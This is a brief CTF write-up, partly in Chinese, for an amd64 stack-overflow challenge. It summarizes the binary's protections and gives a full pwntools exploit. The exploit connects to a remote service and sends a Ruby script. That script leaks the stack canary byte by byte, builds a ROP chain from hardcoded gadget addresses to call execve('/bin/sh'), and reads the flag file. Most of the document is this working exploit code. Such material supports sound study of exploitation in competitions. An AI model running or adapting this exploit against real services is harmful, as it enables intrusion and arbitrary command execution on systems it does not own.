# poc
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

> 泄漏canary -> 栈溢出 -> ROP -> execve("/bin/sh", 0, 0)

栈溢出，由于数组在canary上面，因此可以泄漏至少相邻1Bcanary，找到可写位置写上"/bin/sh\x00"，通过ROP构造execve("/bin/sh", 0, 0)，需要用到ruby脚本。

# exp

```python
from pwn import *

p = remote('54.65.72.116', 31337)

payload = '''
p = Sock.new '127.0.0.1', 31338
pad = 0xdeadbeefdeadbeef
g1 = 0x00000000004125e3
s = '/bin/sh\x00'
g2 = 0x00000000004005d5
g3 = 0x000000000049e472
g4 = 0x00000000004017f7
g5 = 0x0000000000443776
g6 = 0x0000000000468e75
write_addr = 0x6ce000
canary = ''
for i in 0..7
    payload = 'a' * (0x18 + i) 
    p.send payload
    r = p.recvuntil '\x0a'
    if r.length == (0x18 + i + 1)
        canary += '\x00'
    else
        canary += r[0x18 + i]
    end
end

payload = 'a' * 0x18 + canary
payload += p64(pad)
payload += p64(g2) + p64(write_addr) + p64(g1)
payload += p64(g5) + s
payload += p64(g3)
payload += p64(g2) + p64(0x3b) + p64(g1)
payload += p64(g2) + p64(write_addr)
payload += p64(g4) + p64(0)
payload += p64(g5) + p64(0)
payload += p64(g6)
p.send payload
p.send 'exit\n'
p.sendline 'cat /home/start/flag'
print p.recv 10000000
print p.recv 10000000
'''

p.sendline(payload)
p.interactive()
```
